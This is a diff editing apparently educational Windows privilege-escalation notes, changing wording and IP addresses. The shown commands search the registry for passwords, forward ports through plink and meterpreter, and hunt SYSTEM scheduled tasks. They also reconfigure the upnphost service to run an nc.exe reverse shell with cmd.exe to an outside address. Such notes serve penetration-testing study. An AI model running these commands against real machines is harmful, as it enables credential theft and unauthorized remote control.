@@ -94,7 +94,7 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-## Internal/Hidden Services
+## Service only available from inside
 
 Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.
 
@@ -132,7 +132,7 @@ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
 
 # Port forward using meterpreter
 portfwd add -l <attacker port> -p <victim port> -r <victim ip>
-portfwd add -l 3306 -p 3306 -r 192.168.222
+portfwd add -l 3306 -p 3306 -r 192.168.1.101
 ```
 
 So how should we interpret the netstat output?
@@ -148,27 +148,29 @@ Local address 192.168.1.9 means that the service is only listening for connectio
 
 ## Kernel exploits
 
-Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine.
+Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine.
 
-1. Step one - Identify the hotfixes/patches
+**Identify the hotfixes/patches**
 
-```
+```bash
+systeminfo
+# or
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
-### Python to Binary
+**Python to Binary**
 
 If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.
 
 ## Scheduled Tasks
 
-Here we are looking for tasks that are run with by a privileged user, and run a binary that we can overwrite.
+Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.
 
 ```
 schtasks /query /fo LIST /v
 ```
 
-This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal and run.
+This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with `findstr`. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal.
 
 Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user.
 
@@ -176,12 +178,13 @@ Yeah I know this ain't pretty, but it works. You can of course change the name S
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
 
-## **Change the upnp service binary**
-`
-sc config upnphost binpath= "C:\Inetpub\nc.exe 10.11.0.191 6666 -e c:\Windows\system32\cmd.exe"`
-sc config upnphost obj= ".\LocalSystem" password= ""
+## Change the upnp service binary
 
-`sc config upnphost depend= ""`
+```cmd
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+```
 
 ## 
 
